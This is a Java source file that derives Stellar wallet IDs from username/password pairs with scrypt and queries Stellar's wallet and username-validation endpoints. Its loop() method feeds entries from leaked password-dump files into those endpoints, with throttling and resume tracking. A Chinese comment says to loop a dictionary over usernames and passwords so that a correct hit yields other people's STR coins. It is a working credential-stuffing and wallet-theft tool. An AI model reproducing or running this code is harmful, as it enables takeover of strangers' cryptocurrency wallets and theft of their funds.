package org.address.database;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ProxySelector;
import java.util.ArrayList;
import java.util.HashSet;

import org.json.JSONObject;
import org.address.password.PasswordGenerator;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.params.ConnRoutePNames;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.ProxySelectorRoutePlanner;
import org.apache.http.util.EntityUtils;
import org.ripple.bouncycastle.util.encoders.Hex;
import org.ripple.power.config.Session;
import org.ripple.power.utils.FileUtils;

import com.lambdaworks.crypto.SCrypt;

public class StellarWallet {

	public static byte[] scrypt(byte[] data) throws Exception {
		return SCrypt.scrypt(data, data, 2048, 8, 1, 256 / 8);
	}

	public String deriveId(String username, String password)
			throws Exception {
		byte[] user_pass = (username.toLowerCase() + password)
				.getBytes("UTF-8");
		byte[] data = Hex.encode(scrypt(user_pass));
		String id = new String(data, "UTF-8");
		return id;
	}

	public boolean open(String user, String pass) throws Exception {
		JSONObject obj = new JSONObject();
		obj.put("id", deriveId(user, pass));
		DefaultHttpClient httpClient = new DefaultHttpClient();
		String address = "https://wallet.stellar.org/wallets/show";
		HttpPost post = new HttpPost(address);
		post.setEntity(new StringEntity(obj.toString()));
		post.setHeader("Accept", "application/json");
		post.setHeader("Content-type", "application/json");
		HttpResponse response = httpClient.execute(post);
		String jsonResponse = EntityUtils.toString(response.getEntity());
		return jsonResponse.indexOf("success") != -1;
	}


	public boolean check(String user) throws Exception {
		if(user.length()<3){
			return false;
		}
		System.out.println(user);
		JSONObject obj = new JSONObject();
		obj.put("username", user);
		DefaultHttpClient httpClient = new DefaultHttpClient();
	
		//configureClientToUseProxy(httpClient, "8580", "127.0.0.1");
	
		String address = "https://api.stellar.org/user/validname";
		HttpPost post = new HttpPost(address);
		
		post.setEntity(new StringEntity(obj.toString()));
		post.setHeader("Accept", "application/json");
		post.setHeader("Content-type", "application/json");
		HttpResponse response = httpClient.execute(post);
		String jsonResponse = EntityUtils.toString(response.getEntity());
		System.out.println(jsonResponse);

		return jsonResponse.indexOf("success") == -1;
	}
	 private static void addProxyIfNeeded(DefaultHttpClient defaultHttpClient) {
		 String proxyPort = System.getProperty("http.proxyPort");
		 String proxyHost = System.getProperty("http.proxyHost");
		 if (proxyPort != null && proxyHost != null) {
		 configureClientToUseProxy(defaultHttpClient, proxyPort, proxyHost);
		 }
		 }
		 private static void configureClientToUseProxy(DefaultHttpClient defaultHttpClient, String proxyPort, String proxyHost) {
		 HttpHost proxy = new HttpHost(proxyHost, Integer.parseInt(proxyPort));
		 defaultHttpClient.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
		 }

		 static	String[] lists2=new String[]{"1","12","123","1234","12345","123456","1234567","12345678","123456789",
					"987654321","87654321","7654321","654321","54321","4321","321","21"};
		 public static void add(StellarWallet w,String text) throws IOException, Exception{

				if(w.check(text)){
       			FileUtils.write(new File("d:\\starlttttteg.txt"), text+"\n",true);
	}
	/*for(int i=0;i<lists2.length;i++){
		if(w.check(text+lists2[i])){
			FileUtils.write(new File("d:\\starlttttteg.txt"), text+lists2[i]+"\n",true);
		}
		if(w.check(lists2[i]+text)){
			FileUtils.write(new File("d:\\starlttttteg.txt"), lists2[i]+text+"\n",true);
		}
  }*/
		 }
		 
	public static void loop() throws  Exception{

		final StellarWallet w = new StellarWallet();
		
		//此处自己写个循环，引入个字典，反复循环穷举用户名和密码即可，撞上正确的你就能获得STR币了……
	//	System.out.println(w.open("ak77777", "ak777771"));
	
		/*
		//qwert
		PasswordGenerator pass = new PasswordGenerator(2,2,"yuiopasdfghjklzxcvbnm");
		
		String text=null;
		
		for(int j=0;(text=pass.generateNextWord())!=null;j++){
		
				if(w.check(text)){
		              			FileUtils.write(new File("d:\\starlttttteg.txt"), text+"\n",true);
				}
				for(int i=0;i<lists.length;i++){
					if(w.check(text+lists[i])){
              			FileUtils.write(new File("d:\\starlttttteg.txt"), text+lists[i]+"\n",true);
					}
					if(w.check(lists[i]+text)){
              			FileUtils.write(new File("d:\\starlttttteg.txt"), lists[i]+text+"\n",true);
					}
		         }
				
				System.out.println(text);
		}
*/
		
		ArrayList<String> files = FileUtils.getAllFiles("D:\\strpass");

		String text;
		for (String file : files) {

			BufferedReader reader = new BufferedReader(new InputStreamReader(
					new FileInputStream(file), "gbk"));
			HashSet<String> lists = new HashSet<String>(1000000);

			// String[] files1=StringUtils.split(file, "\\");
			Session session = new Session("str_md5"
					+ FileUtils.getFileName(file));
			int max = session.getInt("save") == -1 ? 0 : session.getInt("save");
			for (int j = 0; (text = reader.readLine()) != null; j++) {
				if (j < max) {
					continue;
				}
				if (j % 3 == 0) {
					Thread.sleep(62000);
					System.out.println(file + ":" + text + "," + j);
					session.set("save", j);
					session.save();
				}
				

				if (text.indexOf(" ") != -1) {
					add(w, text);
				}
				if (text.indexOf("\t") != -1) {
					String[] res = text.split("\t");
					for (int i = 0; i < res.length; i++) {
						if (lists.add(res[i])) {
							add(w, res[i]);
						}
					}

				} else if (text.indexOf("#") != -1) {
					String[] res = text.split("#");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							add(w, t);
						}
					}

				} else if (text.indexOf(",") != -1) {
					String[] res = text.split(",");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							add(w, t);
						}
					}

				} else if (text.indexOf(":") != -1) {
					String[] res = text.split(":");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							add(w, t);
						}
					}

				} else if (text.indexOf("/") != -1) {
					String[] res = text.split("/");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							add(w, t);
						}
					}

				} else if (text.indexOf("|") != -1) {
					String[] res = text.split("|");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							add(w, t);
						}
					}

				} else if (text.indexOf(" ") != -1) {
					String[] res = text.split(" ");
					for (int i = 0; i < res.length; i++) {
						String t = res[i].trim();
						if (lists.add(t)) {
							add(w, t);
						}
					}

				} else {
					if (lists.add(text)) {
						add(w, text);
					}
				}
				try {
					Thread.yield();
				} catch (Exception ex) {

				}
		
			}
			reader.close();
		}
		
			
			
		
	}
	
	public static void main(String[] args) {
		
		Thread thread = new Thread(){
			public void run(){
				try {
					loop();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		};
		thread.start();
		
	}
		
		
		
		
		
	
}
